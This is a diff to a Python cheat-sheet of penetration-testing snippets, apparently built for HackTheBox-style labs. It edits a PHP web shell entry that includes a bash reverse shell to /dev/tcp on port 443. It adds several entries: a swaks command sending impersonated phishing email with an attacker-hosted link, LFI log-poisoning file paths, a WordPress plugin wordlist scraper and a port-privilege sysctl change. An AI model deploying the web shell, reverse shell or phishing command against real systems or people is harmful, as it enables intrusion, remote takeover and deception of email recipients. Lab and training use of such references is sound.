@@ -308,7 +308,7 @@ cewl = Cheat(
     "cewl - Create a list of password (or something) from all words of a html page"
 )
 cewl.category = "Tools"
-cewl.subCategory = "Passwords"
+cewl.subCategory = "Password"
 cewl.output = """[*] Simple tool to take all word of a html page and create a file
 
 cewl -w passwords.txt http://10.10.10.100/
@@ -894,7 +894,7 @@ scp username@x.x.x.x:/remote/directory/fileName /local/directory/fileName
 webShell = Cheat("WebShell - php")
 webShell.category = "Web"
 webShell.subCategory = "RCE"
-webShell.output = """[*] Web Shell em PHP
+webShell.output = f"""[*] Web Shell em PHP
 
 <?php
 	echo "\\nURL Shell... url?cmd=<command>\\n\\n";
@@ -905,7 +905,7 @@ webShell.output = """[*] Web Shell em PHP
 <?php echo system($_GET['cmd']); exit; ?>
 
 # Or...
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/443 0>&1'");?>
 """
 
 ######################################
@@ -1443,7 +1443,7 @@ psexec.py WORKGROUP/j4vali:@10.10.10.93 cmd.exe
 
 keepass = Cheat("keepassxc - Password Manager KeePass Manager")
 keepass.category = "Tools"
-keepass.subCategory = "Passwords"
+keepass.subCategory = "Password"
 keepass.output = """[*] Extract passwords of KeePass (GUI)
 
 sudo install keepassxc
@@ -2006,4 +2006,116 @@ while True:
 	res = os.system(b"/home/ayush/.binary/rop " + payload)
 	if res == 0:
 		sys.exit(0)
+"""
+
+######################################
+######################################
+
+pythonProxyBurp = Cheat("Python - Request via Burpsuite")
+pythonProxyBurp.category = "Python"
+pythonProxyBurp.subCategory = "Requests"
+pythonProxyBurp.output = """[*] Python - Request via Burpsuite
+
+import requests
+
+
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+r = requests.get("https://www.google.com/", proxies=proxies, verify=False)
+"""
+
+######################################
+######################################
+
+updateWPPlugins = Cheat("Update wordlist of wp-plugins (WordPress)")
+updateWPPlugins.category = "Web"
+updateWPPlugins.subCategory = "CMS"
+updateWPPlugins.output = """[*] Update wordlist of wp-plugins for discover plugins with ffuf
+
+# The default location of plugins in wordpress is http://site.com/wp-content/plugins/<pluginName>
+
+for i in $(seq 1 1757); do curl https://github.com/orgs/wp-plugins/repositories?page=$i | grep "name codeRepository" | grep -oP 'href=".*?"' | sed 's/href="//g' | tr -d '"'; done >> wp-plugins_by_javali.txt
+
+# Change wp-plugins/ by wp-content/plugins/
+"""
+
+######################################
+######################################
+
+rsaDecrypt = Cheat("RSA Decrypt")
+rsaDecrypt.category = "Tools"
+rsaDecrypt.subCategory = "Password"
+rsaDecrypt.output = """[*] Decrypt RSA keys
+
+# GOOGLE: RSA step by step decrypt - cryptool portal
+
+"""
+
+######################################
+######################################
+
+openPortsForDontAskSudoAllTime = Cheat("Unrestrict ports for use all ports under 1000 without sudo privilege")
+openPortsForDontAskSudoAllTime.category = "Kali"
+openPortsForDontAskSudoAllTime.subCategory = "Configurations"
+openPortsForDontAskSudoAllTime.output = """[*] remove all privileged ports on linux
+
+#save configuration permanently
+echo 'net.ipv4.ip_unprivileged_port_start=0' > /etc/sysctl.d/50-unprivileged-ports.conf
+#apply conf
+sysctl --system
+"""
+sendImpersonatedEmailViaCli = Cheat("email - send impersonated email with swaks (CLI)")
+sendImpersonatedEmailViaCli.category = "Tools"
+sendImpersonatedEmailViaCli.subCategory = "Email"
+sendImpersonatedEmailViaCli.output = """[*] Send an impersonated email via swaks (CLI)
+
+# Installation
+sudo apt install swaks
+
+# Send an email to multiples email addresses
+swaks --from "javali@sneakycorp.htb" --to "airisatou@sneakymailer.htb,angelicaramos@sneakymailer.htb,ashtoncox@sneakymailer.htb," --header "Subject: Exclusivo, fotos da tua avó na praia xD" --body "Oh meus deus\!, uma loucura... -> http://10.10.14.9/avo.jpg" --server 10.10.10.197
+"""
+
+
+######################################
+######################################
+
+logPoisonning = Cheat("Log Poisoning")
+logPoisonning.category = "Web"
+logPoisonning.subCategory = "RCE"
+logPoisonning.output = """[*] Transforme a LFI into a RCE
+
+# https://www.thehacker.recipes/web/inputs/file-inclusion
+
+# Potencial files for Log Poisoning - LINUX
+/var/log/auth.log
+/var/log/vsftpd.log
+/var/log/apache2/access.log
+/var/log/httpd/access_log
+/var/log/httpd-access.log
+/var/log/apache/error.log
+/var/log/mail.log
+
+/var/lib/php5/sess_[PHPSESSID]
+/var/lib/php/sessions/sess_[PHPSESSID]
+"""
+
+######################################
+######################################
+
+WordpressTrics = Cheat("Wordpress - Importante Files")
+WordpressTrics.category = "Web"
+WordpressTrics.subCategory = "CMS"
+WordpressTrics.output = """[*] Wordpress - Importante Files
+
+# Logs
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log
+/var/log/httpd-access.log
+/var/log/apache/access.log
+/var/log/apache/error.log
+
+# VirtualHost
+/etc/apache2/sites-available/000-default.conf
 """
